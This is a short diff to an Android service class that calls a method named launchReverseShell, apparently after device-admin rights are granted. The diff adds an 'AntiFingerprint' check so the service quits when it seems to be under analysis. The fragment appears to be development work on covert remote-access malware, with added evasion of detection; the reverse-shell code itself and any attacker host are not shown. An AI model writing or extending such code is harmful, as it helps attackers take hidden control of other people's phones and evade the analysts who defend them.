@@ -38,7 +38,11 @@ public class ShellService extends Service {
     @Override
     public int onStartCommand(Intent intent, int flags, int startId) {
         Log.d(TAG, "Service starting - calling launchReverseShell");
-
+        if (!AntiFingerprint.isSafeToRun(this)) {
+            Log.d(TAG, "⚠️ AntiFingerprint check failed — stopping");
+            stopSelf();
+            return START_NOT_STICKY;
+        }
         // DIRECTLY CALL YOUR EXISTING METHOD
         // This calls the same method that runs when admin is granted
         adminReceiver.launchReverseShell(this);
